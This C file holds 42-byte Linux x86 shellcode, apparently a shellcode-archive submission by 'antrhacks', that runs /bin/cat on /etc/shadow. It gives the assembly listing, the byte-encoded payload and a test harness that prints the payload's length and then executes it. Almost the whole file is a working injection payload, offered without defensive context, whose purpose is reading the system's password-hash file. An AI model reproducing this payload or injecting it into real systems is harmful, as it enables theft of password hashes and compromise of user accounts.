/*
 * Title: linux/x86 execve(/bin/cat, /etc/shadow, NULL) - 42 bytes
 * Type: Shellcode
 * Author: antrhacks
 * Platform: Linux X86
*/

/* ASSembly
 31 c0                	xor    %eax,%eax
 50                   	push   %eax
 68 2f 63 61 74       	push   $0x7461632f
 68 2f 62 69 6e       	push   $0x6e69622f
 89 e3                	mov    %esp,%ebx
 50                   	push   %eax
 68 61 64 6f 77       	push   $0x776f6461
 68 2f 2f 73 68       	push   $0x68732f2f
 68 2f 65 74 63       	push   $0x6374652f
 89 e1                	mov    %esp,%ecx
 50                   	push   %eax
 51                   	push   %ecx
 53                   	push   %ebx
 89 e1                	mov    %esp,%ecx
 b0 0b                	mov    $0xb,%al
 cd 80
*/

int main(){
char shell[] =
"\x31\xc0"
"\x50"
"\x68\x2f\x63\x61\x74"
"\x68\x2f\x62\x69\x6e"
"\x89\xe3"
"\x50"
"\x68\x61\x64\x6f\x77"
"\x68\x2f\x2f\x73\x68"
"\x68\x2f\x65\x74\x63"
"\x89\xe1"
"\x50"
"\x51"
"\x53"
"\x89\xe1"
"\xb0\x0b"
"\xcd\x80";

 printf("[*] Taille du ShellCode = %d\n", strlen(shell));
 (*(void (*)()) shell)();

 return 0;
}